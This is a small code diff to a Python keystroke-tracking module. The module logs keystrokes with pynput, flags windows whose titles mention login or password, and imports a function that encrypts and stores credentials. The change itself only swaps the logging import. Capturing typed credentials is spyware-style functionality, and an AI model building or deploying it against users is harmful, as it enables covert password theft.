@@ -6,12 +6,12 @@ Logs keystrokes, detects sensitive input, and batches logs.
 import threading
 import time
 import queue
+import logger
 from typing import Optional
 from pynput import keyboard
 from storage.db import log_keystrokes_batch
 from tracker.window_tracker import get_active_window
 from storage.security import encrypt_and_store_credential
-import logging
 
 SENSITIVE_KEYWORDS = ["login", "sign in", "password", "auth"]
 BATCH_SIZE = 20
@@ -21,7 +21,7 @@ event_queue = queue.Queue()
 keystroke_buffer = []
 buffer_lock = threading.RLock()
 typed_buffer = []
-logger = logging.getLogger("keystroke_tracker")
+logger = logger.getLogger("KEYSTROKE")
 
 def is_sensitive_window(title: Optional[str]) -> bool:
     """Return True if the window title suggests sensitive input."""
